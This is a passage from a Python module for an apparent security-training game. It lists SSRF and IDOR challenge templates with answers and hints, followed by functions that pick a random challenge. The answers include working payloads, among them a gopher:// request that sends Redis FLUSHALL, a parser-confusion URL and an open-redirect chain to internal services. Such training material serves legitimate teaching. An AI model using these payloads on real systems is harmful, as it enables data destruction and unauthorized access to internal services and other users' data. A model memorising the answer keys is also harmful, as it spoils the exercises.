            "xp_reward": 250,
            "hint": "DNS rebinding: first response passes validation, second is internal"
        },
        {
            "title": "SSRF to Redis",
            "difficulty": "Hard",
            "description": "Exploit SSRF to access Redis server",
            "question": "Access the internal Redis server and exfiltrate data.",
            "answer": "http://localhost:6379/",
            "xp_reward": 225,
            "hint": "Redis runs on port 6379 by default"
        },
        {
            "title": "SSRF to Internal SMTP",
            "difficulty": "Medium",
            "description": "Access internal SMTP server via SSRF",
            "question": "Access the internal SMTP server and enumerate users.",
            "answer": "http://localhost:25/",
            "xp_reward": 175,
            "hint": "SMTP servers can reveal user information via VRFY command"
        },
        {
            "title": "SSRF via URL Parser Confusion",
            "difficulty": "Hard",
            "description": "Exploit URL parser differences for SSRF",
            "question": "The application uses different URL parsers. Exploit this to bypass SSRF protections.",
            "answer": "http://attacker.com@localhost/",
            "xp_reward": 250,
            "hint": "Different parsers handle @ and : differently"
        },
        {
            "title": "SSRF to Internal Jenkins",
            "difficulty": "Medium",
            "description": "Access internal Jenkins server via SSRF",
            "question": "Access the Jenkins dashboard running on internal network.",
            "answer": "http://localhost:8080/jenkins/",
            "xp_reward": 175,
            "hint": "Jenkins often runs on port 8080"
        },
        {
            "title": "SSRF via Open Redirect",
            "difficulty": "Medium",
            "description": "Chain open redirect with SSRF",
            "question": "There's an open redirect on the site. Chain it with SSRF to bypass filters.",
            "answer": "http://target.com/redirect?url=http://localhost:8080/admin",
            "xp_reward": 200,
            "hint": "Open redirects can bypass SSRF blacklists"
        },
        {
            "title": "SSRF to Internal Elasticsearch",
            "difficulty": "Hard",
            "description": "Access Elasticsearch cluster via SSRF",
            "question": "Access the internal Elasticsearch instance and query sensitive data.",
            "answer": "http://localhost:9200/_search",
            "xp_reward": 225,
            "hint": "Elasticsearch REST API is accessible without auth by default"
        },
        {
            "title": "SSRF via Gopher Protocol",
            "difficulty": "Hard",
            "description": "Use gopher:// protocol for SSRF",
            "question": "The application supports gopher:// protocol. Use it to interact with internal services.",
            "answer": "gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a",
            "xp_reward": 250,
            "hint": "Gopher protocol can send raw TCP data to internal services"
        }
    ],
    "IDOR": [
        {
            "title": "Basic IDOR in User Profile",
            "difficulty": "Easy",
            "description": "Access other users' profiles via IDOR",
            "question": "Change the user ID in the URL to access another user's profile data.",
            "answer": "Change /api/user/1001 to /api/user/1002",
            "xp_reward": 100,
            "hint": "Try incrementing or decrementing the user ID"
        },
        {
            "title": "IDOR in API Responses",
            "difficulty": "Medium",
            "description": "Exploit IDOR in REST API",
            "question": "The API returns different user data based on ID parameter. Access admin account.",
            "answer": "Change user_id parameter to admin's ID",
            "xp_reward": 150,
            "hint": "API parameters often lack proper authorization checks"
        },
        {
            "title": "IDOR in Document IDs",
            "difficulty": "Medium",
            "description": "Access other users' documents via IDOR",
            "question": "Document IDs are sequential. Access another user's private document.",
            "answer": "Change document ID from 123 to 124",
            "xp_reward": 150,
            "hint": "Sequential IDs in URLs often lead to IDOR"
        },
        {
            "title": "IDOR in UUID",
            "difficulty": "Hard",
            "description": "Exploit IDOR even with UUIDs",
            "question": "The application uses UUIDs but still has IDOR. Find another user's data.",
            "answer": "Predict or enumerate UUIDs from responses",
            "xp_reward": 200,
            "hint": "UUIDs can sometimes be predicted or found in other responses"
        },
        {
            "title": "Horizontal Privilege Escalation",
            "difficulty": "Medium",
            "description": "Access other users' data at same privilege level",
            "question": "Access another regular user's order history.",
            "answer": "Change order_id or user_id parameter",
            "xp_reward": 150,
            "hint": "Horizontal escalation: same role, different user data"
        },
        {
            "title": "Vertical Privilege Escalation",
            "difficulty": "Hard",
            "description": "Access admin functionality via IDOR",
            "question": "Access admin-only functionality by manipulating parameters.",
            "answer": "Change role parameter or access admin endpoints",
            "xp_reward": 225,
            "hint": "Vertical escalation: gain higher privileges"
        },
        {
            "title": "IDOR in Password Reset",
            "difficulty": "Medium",
            "description": "Exploit IDOR in password reset token",
            "question": "Password reset tokens are predictable. Reset another user's password.",
            "answer": "Predict or brute force reset token",
            "xp_reward": 175,
            "hint": "Weak tokens can be predicted or brute-forced"
        },
        {
            "title": "IDOR in GraphQL",
            "difficulty": "Hard",
            "description": "Exploit IDOR in GraphQL API",
            "question": "The GraphQL API has IDOR. Query other users' sensitive data.",
            "answer": "Modify id parameter in GraphQL query",
            "xp_reward": 225,
            "hint": "GraphQL queries often trust user-provided IDs"
        },
        {
            "title": "IDOR via Hash Comparison",
            "difficulty": "Medium",
            "description": "Exploit IDOR when app uses hashed IDs",
            "question": "The application uses hashed IDs but compares them insecurely.",
            "answer": "Use timing attack or length extension",
            "xp_reward": 175,
            "hint": "Hash comparison can be vulnerable to timing attacks"
        },
        {
            "title": "Mass IDOR Enumeration",
            "difficulty": "Medium",
            "description": "Enumerate all users via IDOR",
            "question": "Enumerate all user accounts by iterating through IDs.",
            "answer": "Loop through user IDs 1-1000",
            "xp_reward": 150,
            "hint": "Automate ID enumeration to extract all data"
        },
        {
            "title": "IDOR in File Downloads",
            "difficulty": "Easy",
            "description": "Download other users' files via IDOR",
            "question": "File download parameter is vulnerable to IDOR. Download another user's invoice.",
            "answer": "Change file_id parameter",
            "xp_reward": 100,
            "hint": "File IDs are often sequential and predictable"
        },
        {
            "title": "IDOR in Order Processing",
            "difficulty": "Medium",
            "description": "View or modify other users' orders",
            "question": "Access and modify another user's pending order.",
            "answer": "Change order_id in request",
            "xp_reward": 150,
            "hint": "Order processing often lacks proper authorization"
        },
        {
            "title": "IDOR via GUID Prediction",
            "difficulty": "Hard",
            "description": "Predict GUIDs to access other users' data",
            "question": "The application uses GUIDs but with weak generation. Predict another user's GUID.",
            "answer": "Analyze GUID pattern or use timestamp-based prediction",
            "xp_reward": 225,
            "hint": "Some GUIDs contain timestamps that can be predicted"
        },
        {
            "title": "IDOR in API Keys",
            "difficulty": "Medium",
            "description": "Access other users' API keys via IDOR",
            "question": "API keys are accessible via IDOR. Steal another user's API key.",
            "answer": "Change api_key_id parameter",
            "xp_reward": 175,
            "hint": "API key management interfaces often have IDOR"
        },
        {
            "title": "IDOR in Messaging",
            "difficulty": "Medium",
            "description": "Read other users' private messages",
            "question": "Message IDs are sequential. Read another user's private messages.",
            "answer": "Change message_id parameter",
            "xp_reward": 150,
            "hint": "Messaging systems often expose message IDs"
        }
    ]
}


def get_random_challenge(category: str = None, difficulty: str = None) -> dict:
    """
    Get a random challenge template
    
    Args:
        category: Challenge category (optional)
        difficulty: Challenge difficulty (optional)
    
    Returns:
        Random challenge template
    """
    import random
    
    # If no category specified, pick random category
    if not category:
        category = random.choice(list(DAILY_CHALLENGE_TEMPLATES.keys()))
    
    # Get challenges for category
    challenges = DAILY_CHALLENGE_TEMPLATES.get(category, [])
    
    if not challenges:
        return None
    
    # Filter by difficulty if specified
    if difficulty:
        challenges = [c for c in challenges if c["difficulty"] == difficulty]
    
    if not challenges:
        # Fallback to any difficulty
        challenges = DAILY_CHALLENGE_TEMPLATES.get(category, [])
    
    # Return random challenge
    return random.choice(challenges)


def get_all_categories() -> list:
    """Get all available challenge categories"""
    return list(DAILY_CHALLENGE_TEMPLATES.keys())


def get_challenge_count(category: str = None) -> int:
    """Get total number of challenges"""
    if category:
        return len(DAILY_CHALLENGE_TEMPLATES.get(category, []))
    
    total = 0
    for challenges in DAILY_CHALLENGE_TEMPLATES.values():
        total += len(challenges)
    return total